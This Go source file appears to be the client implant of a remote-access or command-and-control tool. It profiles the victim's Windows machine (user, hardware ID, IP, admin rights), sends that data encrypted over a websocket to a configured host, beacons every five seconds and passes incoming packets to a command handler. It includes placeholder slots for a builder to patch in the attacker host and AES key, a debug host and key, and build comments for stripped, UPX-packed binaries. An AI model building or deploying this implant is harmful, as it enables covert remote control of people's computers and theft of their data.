package main

import (
	"fmt"
	Encrypt "main/Encrypt/Windows"
	HandlePacket "main/HandlePacket/Windows"
	"main/MessagePack"
	PcInfo "main/PcInfo/Windows"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/togettoyou/wsc"
	"golang.org/x/sys/windows/registry"
)

type Client struct {
	Connection *wsc.Wsc
	lock       sync.Mutex
	keepAlive  *time.Ticker
}

func (c *Client) SendData(data []byte) {
	endata, err := Encrypt.Encrypt(data)
	if err != nil {
		return
	}
	c.Connection.SendBinaryMessage(endata)
}

func SendInfo() []byte {
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientInfo")
	msgpack.ForcePathObject("OS").SetAsString(PcInfo.GetOSVersion())
	msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())
	msgpack.ForcePathObject("User").SetAsString(PcInfo.GetCurrentUser())
	msgpack.ForcePathObject("LANip").SetAsString(PcInfo.GetInternalIP())
	msgpack.ForcePathObject("ProcessName").SetAsString(PcInfo.GetProcessName())
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	msgpack.ForcePathObject("SleepTime").SetAsString("10")
	msgpack.ForcePathObject("RemarkMessage").SetAsString(PcInfo.RemarkContext)
	msgpack.ForcePathObject("RemarkClientColor").SetAsString(PcInfo.RemarkColor)
	msgpack.ForcePathObject("Admin").SetAsString(PcInfo.IsAdmin())
	msgpack.ForcePathObject("CLRVersion").SetAsString(PcInfo.ClrVersion)
	msgpack.ForcePathObject("Group").SetAsString(PcInfo.GroupInfo)
	msgpack.ForcePathObject("ClientComputer").SetAsString(PcInfo.GetClientComputer())
	//println(string(msgpack.Encode2Bytes()))
	msgpack.ForcePathObject("WANip").SetAsString("0.0.0.0")
	return msgpack.Encode2Bytes()
}

func (c *Client) Connect(url string) {
	runtime.GC()
	done := make(chan bool)
	c.Connection = wsc.New(url)
	// Customizable configuration, do not use default configuration
	c.Connection.SetConfig(&wsc.Config{
		// Write timeout
		WriteWait: 10 * time.Second,
		// The maximum length of the message supported is 512 bytes by default
		//MaxMessageSize: 1024 * 1024 * 10,
		// Minimum reconnection time interval
		MinRecTime: 2 * time.Second,
		// Maximum reconnection time interval
		MaxRecTime: 60 * time.Second,
		// The multiplier factor for the time interval between reconnections after each reconnection failure, increasing until the maximum reconnection time interval is reached
		RecFactor: 1.5,
		// Message sending buffer pool size, default is 256
		MessageBufferSize: 10240 * 10,
	})
	// Set callback processing
	c.Connection.OnConnected(func() {
		//log.Println("connected!")
		c.SendData(SendInfo())
	})
	c.Connection.OnConnectError(func(err error) {
		//log.Println("connect error!")
	})
	c.Connection.OnDisconnected(func(err error) {
		//log.Println("disconnected!")
	})
	c.Connection.OnClose(func(code int, text string) {
		//log.Println("close!")
		done <- true
	})
	c.Connection.OnTextMessageSent(func(message string) {
		//log.Println("text_message_sent:" + message)
	})
	c.Connection.OnBinaryMessageSent(func(data []byte) {
		//log.Println("binary_message_sent: ", string(data))
	})
	c.Connection.OnSentError(func(err error) {
		//log.Println("sent_error: " + err.Error())
	})
	c.Connection.OnPingReceived(func(appData string) {
		//log.Println("ping: ", appData)
		runtime.GC()
	})
	c.Connection.OnPongReceived(func(appData string) {
		//log.Println("pong: ", appData)
	})
	c.Connection.OnTextMessageReceived(func(message string) {
		//log.Println("text_message_received: ", message)
	})
	c.Connection.OnBinaryMessageReceived(func(data []byte) {
		//log.Println("binary_message_received: ", string(data))
		HandlePacket.Read(data, c.Connection)
	})

	go c.Connection.Connect()
	c.keepAlive = time.NewTicker(5 * time.Second)

	// 	// Start a goroutine to handle the ticks
	go func() {
		for range c.keepAlive.C {
			c.KeepAlivePacket()
		}
	}()
	//go controller.Start()
	for {
		select {
		case <-done:
			return
		}
	}
}

func (c *Client) KeepAlivePacket() {
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientPing")
	msgpack.ForcePathObject("Message").SetAsString("DDDD")
	c.SendData(msgpack.Encode2Bytes())
}

func run_main(Host string) {
	client := &Client{}
	client.Connect(Host)
}
func getClrVersion() string {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full`, registry.QUERY_VALUE)
	if err != nil {
		return "v2.0" // If the registry cannot be accessed, assume CLR 2.0 is returned
	}
	defer key.Close()

	// If the Release key is present, CLR 4.0 or higher is installed
	if _, _, err := key.GetIntegerValue("Release"); err == nil {
		return "v4.0"
	}

	return "v2.0"
}

// var host = "192.168.8.123" // assuming for the sake of example
// var port = "4000"

var ClientWorking bool

func main() {
	//release
	// Host := "HostAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJ"
	// Port := "PortAAAABBBBCCCCDDDD"
	// ListenerName := "ListenNameAAAABBBBCCCCDDDD"
	// route := "RouteAAAABBBBCCCCDDDD"
	// PcInfo.AesKey = "AeskAAAABBBBCCCC"
	// PcInfo.Host = strings.ReplaceAll(Host, " ", "")
	// PcInfo.Port = strings.ReplaceAll(Port, " ", "")
	//PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
	PcInfo.ProcessID = PcInfo.GetProcessID()
	PcInfo.HWID = PcInfo.GetHWID()
	PcInfo.ClrVersion = getClrVersion()

	///Debug
	Host := "10.211.55.4"
	Port := "4000"
	PcInfo.ListenerName = "asd"
	PcInfo.AesKey = "QWERt_CSDMAHUATW"
	route := "www"
	// // //url := "ws://www.sftech.shop:443//www"
	url := "ws://" + Host + ":" + Port + "/" + route

	// url := "ws://tests.sftech.shop:443/Echo"
	url = strings.ReplaceAll(url, " ", "")
	fmt.Println(url)
	run_main(url)

}

//cmd:
//Linux：
//set GOOS=linux
//set GOARCH=amd64

//windows:
//set GOOS=windows
//set GOARCH=amd64

//powershell:
//Linux:
//$env:GOOS="linux"
//$env:GOARCH="amd64"
//Windows:
//$env:GOOS="windows"
//$env:GOARCH="amd64"

//CGO_ENABLED=0 GOOS=linux go build -a -ldflags="-s -w" -installsuffix cgo -o Winmain.exe main.go && upx -9 Client
//set GOARCH=mips
//set GOOS=linux

//MacOS
//set GOOS=darwin
//set GOARCH=amd64
